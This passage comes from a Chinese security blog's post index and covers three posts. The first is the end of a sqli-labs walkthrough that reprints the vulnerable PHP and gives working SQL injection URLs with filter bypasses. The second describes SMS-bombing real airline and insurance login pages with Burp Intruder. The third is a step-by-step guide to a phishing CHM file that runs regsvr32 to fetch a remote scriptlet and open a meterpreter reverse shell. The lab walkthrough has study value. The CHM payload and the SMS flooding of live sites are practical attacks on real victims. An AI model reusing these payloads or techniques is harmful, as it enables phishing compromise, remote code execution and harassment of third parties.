class="line">http://35.201.152.114:8000/Less-28/?id=0%27)%a0un/**/ion%a0sel/**/ect%a01,user(),3|(%271</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/28/kMddyV.png" alt="kMddyV.png"></p><p>第28a关代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-28a Trick with SELECT &amp; UNION&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">//fiddling with comments</span><br><span class="line">$id= blacklist($id);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo $id;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">//print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">//$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">//$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">//$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">//$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-28a.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-28a-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>这里把一些过滤去掉了，也就是说无法用/**/了= =，不过不慌<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">他这里只剩下匹配union+select这里的union和select大小写绕过中间的空格用%a0代替</span><br><span class="line">http://35.201.152.114:8000/Less-28a/?id=0%27)%a0uNion%a0sELECT%a01,database(),3|(%271</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/28/kMwZ0U.png" alt="kMwZ0U.png"></p><p>第29关代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-29 Protection with WAF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">//disable error reporting</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$qs = $_SERVER[&apos;QUERY_STRING&apos;];</span><br><span class="line">$hint=$qs;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-29.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-29-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: The Query String you input is: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>这关我搞不明白为什么没过滤= =。。。，直接带走<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://35.201.152.114:8000/Less-29/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)|%271</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/28/kM0VgI.md.png" alt="kM0VgI.md.png"></p><p>30关代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-30&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">//disable error reporting</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$qs = $_SERVER[&apos;QUERY_STRING&apos;];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id = &apos;&quot;&apos; .$id. &apos;&quot;&apos;;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">//print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-30.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-30-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: The Query String you input is: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>也是没过滤。。。。带走<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://35.201.152.114:8000/Less-30/?id=0%22union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7573657273%20limit%200,1%20--+</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/28/kM0DPJ.md.png" alt="kM0DPJ.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SMS bombing</title>
      <link href="/posts/299eb776.html"/>
      <url>/posts/299eb776.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天早上，想挖一个逻辑漏洞来掌握一下技巧，就上google直接搜intext:获取验证码 inurl:/login，然后找到一个某航空的短信轰炸和某平安的<br><img src="https://game.manga-joho.com/wp-content/uploads/2018/06/Screenshot_20180624-194317-min-e1529837190130.jpg" alt="Screenshot_20180624-194317-min-e1529837190130.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>某平安</b><br><img src="https://s2.ax1x.com/2019/01/28/kKolWt.md.png" alt="kKolWt.md.png"><br>burp抓包<br><img src="https://s2.ax1x.com/2019/01/28/kKo8Qf.png" alt="kKo8Qf.png"><br>发送到Repeater尝试修改zoneCode里面的数值，发现没有规律。有些能够发送成功，有些失败<br>zoneCode:98<br><img src="https://s2.ax1x.com/2019/01/28/kKoUoj.md.png" alt="kKoUoj.md.png"></p><p>zoneCode:88<br><img src="https://s2.ax1x.com/2019/01/28/kKo0Wq.png" alt="kKo0Wq.png"></p><p>然后改为其他的有的又能发送成功，直接发送到intruder然后fuzz。<br><img src="https://s2.ax1x.com/2019/01/28/kKosyT.png" alt="kKosyT.png"></p><p>结果：<br><img src="https://s2.ax1x.com/2019/01/28/kKo2TJ.png" alt="kKo2TJ.png"></p><p><img src="https://s2.ax1x.com/2019/01/28/kKofYR.png" alt="kKofYR.png"></p><p><b>某航空</b><br><img src="https://s2.ax1x.com/2019/01/28/kKoHmD.png" alt="kKoHmD.png"></p><p>抓包后发送到Repeater,直接点击两次发送，居然两次都能成功。也就是没有效验或限制了，直接发送到intruder<br><img src="https://s2.ax1x.com/2019/01/28/kKTP0g.png" alt="kKTP0g.png"></p><p><img src="https://s2.ax1x.com/2019/01/28/kKTZpq.md.png" alt="kKTZpq.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/28/kKTe10.png" alt="kKTe10.png"></p><p>手机截图，，，，嗯。。。实验到一半好像烂了充不进电，所以很抱歉= =<br><img src="https://ws1.sinaimg.cn/large/005GOaLIgy1fxycd6uqhhj3073073mx2.jpg" alt="005GOaLIgy1fxycd6uqhhj3073073mx2.jpg"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Chm fishing</title>
      <link href="/posts/5a94aee0.html"/>
      <url>/posts/5a94aee0.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天早上看到一个chm钓鱼的恶意事件，一时之间感觉蛮有趣。然后上google操作了一波发现不少这种操作。后面随手打开撸了一波，这里做个笔记<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181212/58c5b28e07dc4395998e1d3a47f376f5.jpeg" alt="58c5b28e07dc4395998e1d3a47f376f5.jpeg"></p><p>资料来源：<br><a href="https://wooyun.js.org/drops/%E9%AB%98%E7%BA%A7%E7%BB%84%E5%90%88%E6%8A%80%E6%89%93%E9%80%A0%E2%80%9C%E5%AE%8C%E7%BE%8E%E2%80%9D%20%E6%8D%86%E7%BB%91%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">高级组合技打造“完美” 捆绑后门 - Evi1cg</a></p><p><a href="http://www.mottoin.com/tech/113429.html" target="_blank" rel="noopener">CHM钓鱼 | MottoIN</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先下载Easy CHM<br><img src="https://s2.ax1x.com/2019/01/27/kucCzd.png" alt="kucCzd.png"></p><p>然后创建一个文件夹然后里面放一个html， 和几个文件夹<br><img src="https://s2.ax1x.com/2019/01/27/kucmFS.png" alt="kucmFS.png"></p><p>calc弹弹弹测试，将以下html写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>然后进行编译，在打开编译后的chm会发现能弹出一个calc<br><img src="https://s2.ax1x.com/2019/01/27/kucJoT.png" alt="kucJoT.png"></p><p><img src="https://s2.ax1x.com/2019/01/27/kuc8e0.md.png" alt="kuc8e0.md.png"></p><p><b>meterpreter反弹测试</b><br>是否会被杀软拦截：是<br>这里我使用venom生成payload<br>项目地址：<a href="https://github.com/r00t-3xp10it/venom" target="_blank" rel="noopener">GitHub - r00t-3xp10it/venom: venom (metasploit) shellcode generator/compiler/listener</a><br>选择好powershell的选项的payload获取exp，然后在攻击机新建一个fanvcio.ico写入如下：</p><p><img src="https://s2.ax1x.com/2019/01/27/kuc4OI.md.png" alt="kuc4OI.md.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    progid=&quot;ShortJSRAT&quot;</span><br><span class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">    &lt;!-- Learn from Casey Smith @subTee --&gt;</span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">            ps1  = &quot;你的exp&quot;;</span><br><span class="line">            $shell=new ActiveXObject(&quot;WScript.Shell&quot;)</span><br><span class="line">            $shell.Run(ps1,0,true);</span><br><span class="line">           </span><br><span class="line"> </span><br><span class="line">        ]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/27/kucWSH.md.png" alt="kucWSH.md.png"><br>然后在html写入如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,regsvr32.exe,/u /n /s /i:http://IP/favicon.ico scrobj.dll&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>然后在用Easy CHM编译，在打开编译后的chm就能获取到一个meterpreter<br><img src="https://s2.ax1x.com/2019/01/27/kucbtS.png" alt="kucbtS.png"></p><p><img src="https://s2.ax1x.com/2019/01/27/kucvXn.png" alt="kucvXn.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
